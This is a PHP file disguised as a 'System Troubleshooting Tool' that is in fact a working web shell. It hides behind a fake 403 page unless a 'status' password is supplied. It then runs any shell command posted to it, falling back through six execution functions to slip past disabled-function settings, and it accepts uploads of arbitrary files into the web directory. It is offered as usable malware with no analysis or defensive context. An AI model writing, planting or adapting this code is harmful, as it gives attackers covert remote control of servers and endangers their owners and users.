<?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
$password = '200';
if (!isset($_GET['status']) || $_GET['status'] !== $password) {
    http_response_code(403);
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403 Access Denied</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f8f9fa; color: #333; text-align: center; padding: 50px; }
        h1 { color: #dc3545; }
    </style>
</head>
<body>
    <h1>403 Access Denied</h1>
    <p>You do not have permission to access this resource.</p>
</body>
</html>';
    exit;
}
$cmd = $_POST['cmd'] ?? '';
$method = '';
$output = '';
$uploadMsg = '';
// Execute command with fallback
if ($cmd) {
    $functions = [
        'system' => function($c) { ob_start(); system($c . ' 2>&1'); return ob_get_clean(); },
        'exec' => function($c) { $tmp = []; exec($c . ' 2>&1', $tmp); return implode("\n", $tmp); },
        'shell_exec' => function($c) { return shell_exec($c . ' 2>&1'); },
        'passthru' => function($c) { ob_start(); passthru($c . ' 2>&1'); return ob_get_clean(); },
        'proc_open' => function($c) {
            $process = proc_open($c . ' 2>&1', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
            if (is_resource($process)) { $out = stream_get_contents($pipes[1]); proc_close($process); return $out; }
            return '';
        },
        'popen' => function($c) { $fp = popen($c . ' 2>&1', 'r'); $out = stream_get_contents($fp); pclose($fp); return $out; }
        //,'backticks' => function($c) { return `$c 2>&1`; }
    ];

    foreach ($functions as $name => $func) {
        if (function_exists($name) && !in_array($name, explode(',', ini_get('disable_functions')))) {
            $output = $func($cmd);
            $method = strtoupper($name);
            break;
        }
    }
}
// Handle file upload
if (isset($_POST['upload'])) {
    $target_dir = "./";
    $target_file = $target_dir . basename($_FILES["uploaded_file"]["name"]);
    if (move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], $target_file)) {
        $uploadMsg = "<br>File uploaded successfully: " . htmlspecialchars(basename($_FILES["uploaded_file"]["name"]));
    } else {
        $uploadMsg = "<br>Error uploading file.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Troubleshooting Tool</title>
    <style>
        :root {
            --primary: #007bff;
            --danger: #dc3545;
            --bg: #f8f9fa;
            --text: #333;
        }
        body {
            font-family: Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 { color: var(--primary); }
        .alert {
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
        }
        .alert-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }
        input[type="text"] {
            width: 80%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        input[type="submit"] {
            background: var(--primary);
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        pre {
            background: #333;
            color: #fff;
            padding: 10px;
            border-radius: 4px;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Troubleshooting Tool</h1>
        <div class="alert alert-warning">
            <strong>Warning:</strong> This tool is for authorized use only.
        </div>
        <form method='post' enctype='multipart/form-data'>
            <input type='file' name='uploaded_file' />
            <br><br>
            <input type='submit' name='upload' value='Upload File' />
        </form>
        <br><hr><br>
        <form method='post'>
            <input type='text' name='cmd' placeholder='Enter command' />
            <input type='submit' value='Execute' />
        </form>
        <?php
        if ($output !== '') {
            echo "<pre><strong>Executed with: $method</strong>\n" . htmlspecialchars($output) . "</pre>";
        }
        echo $uploadMsg;
        ?>
    </div>
</body>
</html>   